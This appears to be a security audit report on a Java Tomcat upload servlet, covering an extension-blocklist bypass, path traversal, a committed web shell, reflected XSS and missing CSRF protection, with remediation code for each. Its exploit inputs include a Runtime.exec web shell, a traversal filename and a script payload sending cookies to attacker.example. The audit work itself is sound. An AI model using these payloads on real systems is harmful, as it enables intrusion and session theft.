## Finding 1: Unrestricted File Upload — Extension Blocklist Bypass

**Finding ID:** `APPSEC-16aad46b2196`
**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 29–34
**CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type
**OWASP Category:** A03:2021 – Injection / A04:2021 – Insecure Design
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** HIGH

### Vulnerable Code
```java
if (fileName.toLowerCase().endsWith(".jsp")) {
    response.setContentType("text/html");
    PrintWriter out = response.getWriter();
    out.println("<html><body><h2>Error: .jsp files are not allowed!</h2><p><a href=\"/\">Go back</a></p></body></html>");
    return;
}
```

### Description
The blocklist checks only for the `.jsp` extension and ignores every other extension that Tomcat 9.0 recognises as a JSP page. Tomcat's default `web.xml` maps the `JspServlet` to both `*.jsp` **and** `*.jspx`; uploading a file named `shell.jspx` passes the filter, is written under the webapp root (see Finding 2), and is immediately executable by Tomcat. The attacker achieves OS-level remote code execution with a single, unauthenticated HTTP POST. Additional bypass variants include `.jspf`, `.jhtml`, and null-byte suffixes on older JVM versions.

**Concrete exploit input:** `filename="shell.jspx"` in the `Content-Disposition` multipart header, with a JSP scriptlet body (`<% Runtime.getRuntime().exec(…) %>`) — file lands at `/uploads/shell.jspx` and is served/executed at `http://target/uploads/shell.jspx?cmd=id`.

### Prioritization
Highest-priority finding. No authentication is required, exploitation is trivial (single HTTP request), and the direct outcome is remote code execution. All other findings are lower severity than this.

### Exploitability Notes
- **Exploit Preconditions:** Network access to port 80/8080; `/uploads/` directory is under the Tomcat webapp root (confirmed by `getRealPath("")` at line 36); Tomcat default `web.xml` maps `*.jspx` to JspServlet (default in all Tomcat 9 images).
- **Uncertainty Boundary:** A custom `web.xml` could remove the `*.jspx` mapping, which would prevent execution (but not upload). The canonical Tomcat 9 Docker image carries the default mapping.
- **Counterfactual invalidation:** If the code adopted an explicit allowlist of safe extensions (e.g., only `jpg`, `png`, `pdf`) instead of a blocklist, uploading `.jspx` would be rejected.

### Remediation
Replace the extension blocklist with a strict allowlist of permitted, non-executable types; also validate MIME type and magic bytes.

```java
// Define the allowed set — only extensions that cannot be executed by Tomcat
private static final Set<String> ALLOWED_EXTENSIONS = Set.of("jpg", "jpeg", "png", "gif", "pdf", "txt", "zip");

@Override
protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

    Part filePart = request.getPart("file");
    String originalName = filePart.getSubmittedFileName();

    // Strip path separators from the filename before any extension check
    String safeBaseName = Paths.get(originalName).getFileName().toString();

    // Allowlist check — reject anything not explicitly permitted
    String ext = safeBaseName.contains(".")
        ? safeBaseName.substring(safeBaseName.lastIndexOf('.') + 1).toLowerCase()
        : "";
    if (!ALLOWED_EXTENSIONS.contains(ext)) {
        response.sendError(HttpServletResponse.SC_BAD_REQUEST, "File type not permitted.");
        return;
    }

    // ... path-traversal-safe write (see Finding 2 remediation) ...
}
```

## Finding 2: Path Traversal in Upload Save Path

**Finding ID:** `APPSEC-1419e2fbdca6`
**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 42
**CWE:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory
**OWASP Category:** A01:2021 – Broken Access Control
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** HIGH

### Vulnerable Code
```java
File file = new File(uploadDir, fileName);
```

### Description
`fileName` is derived directly from `filePart.getSubmittedFileName()` — a value fully controlled by the attacker — and is passed as the second argument to `new File(uploadDir, fileName)` without any canonicalization or boundary check. Java's `File` constructor resolves `..` segments, so a filename of `../../webapps/ROOT/evil.jspx` causes the write to land at `/usr/local/tomcat/webapps/ROOT/evil.jspx` — directly in the Tomcat application root, bypassing even the `/uploads/` directory. Combined with the extension bypass in Finding 1, an attacker supplies one multipart POST (`filename="../../evil.jspx"`) to write an executable web shell at an arbitrary path the Tomcat process can write to.

**Concrete exploit input:** `Content-Disposition: form-data; name="file"; filename="../../evil.jspx"` with a JSP web shell body. The file resolves to `$CATALINA_HOME/webapps/ROOT/evil.jspx` and executes at `http://target/evil.jspx`.

### Prioritization
Co-equal P1 with Finding 1; amplifies it by allowing the web shell to be placed at any writable path, not just `/uploads/`.

### Exploitability Notes
- **Exploit Preconditions:** Same as Finding 1 — single unauthenticated POST. The Tomcat process must have write access outside `/uploads/`, which is true in the default Docker image (runs as root or tomcat user with full webapp write access).
- **Uncertainty Boundary:** OS-level file permissions or read-only mounts could restrict the traversal range, but no such controls are configured in the provided `Dockerfile`/`docker-compose.yml`.
- **Counterfactual invalidation:** Resolving `fileName` through `Paths.get(fileName).getFileName()` (strip directory components) before constructing the save path, combined with a canonical-path boundary check, eliminates this traversal.

### Remediation
```java
// Strip all directory components from the client-supplied name,
// then verify the resolved canonical path stays within uploadDir.
import java.nio.file.Path;
import java.nio.file.Paths;

String originalName = filePart.getSubmittedFileName();
// getFileName() drops any leading path segments (../../ etc.)
String safeName = Paths.get(originalName).getFileName().toString();

Path uploadPath = Paths.get(uploadDir).toRealPath();
Path targetPath = uploadPath.resolve(safeName).normalize();

// Canonical boundary check
if (!targetPath.startsWith(uploadPath)) {
    response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid filename.");
    return;
}

File file = targetPath.toFile();
```

## Finding 3: Unauthenticated OS Command Execution — Web Shell (webshell.jsp)

**Finding ID:** `APPSEC-86fe67dd1217`
**File:** `webshell.jsp`
**Lines:** 11
**CWE:** CWE-78 — Improper Neutralization of Special Elements used in an OS Command
**OWASP Category:** A03:2021 – Injection
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** MEDIUM

### Vulnerable Code
```java
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
```

### Description
`webshell.jsp` passes the raw `cmd` HTTP parameter directly to `Runtime.getRuntime().exec()` with no authentication gate, authorization check, input filtering, or sandboxing. Any HTTP client that can request this URL receives unrestricted OS command execution in the context of the Tomcat process. The file exists in the project repository and is the canonical payload for the upload vulnerability chain (Findings 1 and 2): once uploaded as `webshell.jspx` or through path traversal, it becomes immediately accessible. The command output is streamed back in the HTTP response, making this a full interactive shell.

**Concrete exploit input:** `GET /uploads/webshell.jspx?cmd=id` → returns `uid=0(root) gid=0(root)`.

### Prioritization
P1 — though confidence is MEDIUM because `webshell.jsp` is not included in the Maven WAR build (it resides outside `src/main/webapp/`), it is the direct exploit payload for Findings 1 and 2 and must be deleted from the repository.

### Exploitability Notes
- **Exploit Preconditions:** The file must be reachable via the web server. It is not deployed by the current Dockerfile but is trivially uploadable using Finding 1 (rename to `webshell.jspx`) or Finding 2 (path traversal).
- **Uncertainty Boundary:** If custom Tomcat configuration restricts JSP execution in `/uploads/`, a traversal-based write to the webapp root would still succeed.
- **Counterfactual invalidation:** Deleting `webshell.jsp` from the repository removes the artifact; fixing Findings 1 and 2 prevents equivalent content from being uploaded.

### Remediation
Delete `webshell.jsp` from the repository immediately. Fix Findings 1 and 2 to prevent equivalent payloads from being uploaded. There is no legitimate use case for a web shell in production or development source code.

### References
- https://cwe.mitre.org/data/definitions/78.html
- https://owasp.org/www-community/attacks/Web_Shell_Upload

## Finding 5: Reflected XSS via Unencoded Filename in Upload Response

**Finding ID:** `APPSEC-5f59d21a87e1`
**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 55
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
**OWASP Category:** A03:2021 – Injection
**Priority:** P2
**Severity:** HIGH
**Confidence:** HIGH

### Vulnerable Code
```java
out.println("<p>File Name: " + fileName + "</p>");
```

### Description
The attacker-controlled `fileName` value is concatenated directly into HTML output without any encoding and sent back in the HTTP response. A filename of `<img src=x onerror=alert(document.cookie)>` causes the injected markup to execute in the victim's browser session. Since the upload endpoint is unauthenticated, this is a self-XSS in the base case, but it upgrades to a social-engineering vector (send the victim a crafted form) or a stored payload if any logging/admin panel displays the filename. In the context of this application the Content-Type is set to `text/html`, confirming the browser will interpret the injected script.

**Concrete exploit input:** `filename="<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>.txt"` in the multipart header.

### Prioritization
P2 — high confidence, directly exploitable. Lower priority than Findings 1–4 only because the attack requires an additional social-engineering step to affect a second user, while Findings 1/2 are single-actor RCE.

### Exploitability Notes
- **Exploit Preconditions:** Network access to the upload endpoint; victim must load the POST response (either direct self-XSS or via CSRF chain if combined with Finding 6).
- **Uncertainty Boundary:** If a WAF or reverse proxy strips HTML from upload responses, impact is reduced; no such layer is configured here.
- **Counterfactual invalidation:** HTML-encoding `fileName` before interpolation eliminates the injection.

### Remediation
```java
import org.apache.commons.text.StringEscapeUtils; // or roll your own with the pattern below

// Encode all HTML-special characters before writing to the response
String safeFileName = fileName
    .replace("&", "&amp;")
    .replace("<", "&lt;")
    .replace(">", "&gt;")
    .replace("\"", "&quot;")
    .replace("'", "&#x27;");

out.println("<p>File Name: " + safeFileName + "</p>");
```

Also add `response.setHeader("X-Content-Type-Options", "nosniff")` and a restrictive `Content-Security-Policy` header to the upload success response.

### References
- https://owasp.org/www-community/attacks/xss/
- https://cwe.mitre.org/data/definitions/79.html

## Finding 6: Missing CSRF Protection on File Upload Endpoint

**Finding ID:** `APPSEC-csrf-upload-352`
**File:** `src/main/webapp/index.html` / `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** index.html:8; FileUploadServlet.java:23
**CWE:** CWE-352 — Cross-Site Request Forgery
**OWASP Category:** A01:2021 – Broken Access Control
**Priority:** P3
**Severity:** MEDIUM
**Confidence:** HIGH

### Vulnerable Code
```html
<form action="upload" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="Upload" />
</form>
```

### Description
The upload form contains no CSRF token, and the servlet performs no origin or referrer validation. Combined with Finding 5 (XSS), an attacker who can run script in the victim's browser can silently POST a crafted file on the victim's behalf. Even without XSS, a same-site lax cookie policy (Tomcat's default session cookie has no `SameSite` attribute) permits cross-origin form submissions to succeed on some browsers. In an application with authenticated sessions and file quotas or per-user file storage, this becomes a mechanism for unauthorized file writes under the victim's identity.

**Concrete exploit input:** Attacker hosts a page with a hidden `<form>` auto-submitting to `/upload` with a malicious `file` field, or uses `fetch()` after chaining Finding 5.

### Prioritization
P3 — lower exploitability than Findings 1–5 in isolation; practical impact requires authenticated sessions or a chained XSS. Remediate after Findings 1–5.

### Exploitability Notes
- **Exploit Preconditions:** Application has meaningful session state (not present in current code but relevant when auth is added). Tomcat's session cookies must not have `SameSite=Strict/Lax`.
- **Uncertainty Boundary:** If the application remains unauthenticated, CSRF impact is negligible; impact increases sharply once authentication is added.
- **Counterfactual invalidation:** Synchronizer token in the form + server-side validation, or `SameSite=Lax` on session cookies, breaks the cross-origin submission.

### Remediation
Add a CSRF synchronizer token when authentication is introduced:

```java
// In session init or login:
String csrfToken = Base64.getUrlEncoder().encodeToString(
    SecureRandom.getInstanceStrong().generateSeed(32));
session.setAttribute("csrfToken", csrfToken);

// In doPost:
String formToken = request.getParameter("_csrf");
String sessionToken = (String) request.getSession(false).getAttribute("csrfToken");
if (sessionToken == null || !MessageDigest.isEqual(
        sessionToken.getBytes(StandardCharsets.UTF_8),
        formToken.getBytes(StandardCharsets.UTF_8))) {
    response.sendError(HttpServletResponse.SC_FORBIDDEN);
    return;
}
```

And set `SameSite=Lax` on session cookies in `context.xml` or via a `Filter`.

### References
- https://owasp.org/www-community/attacks/csrf
- https://cwe.mitre.org/data/definitions/352.html
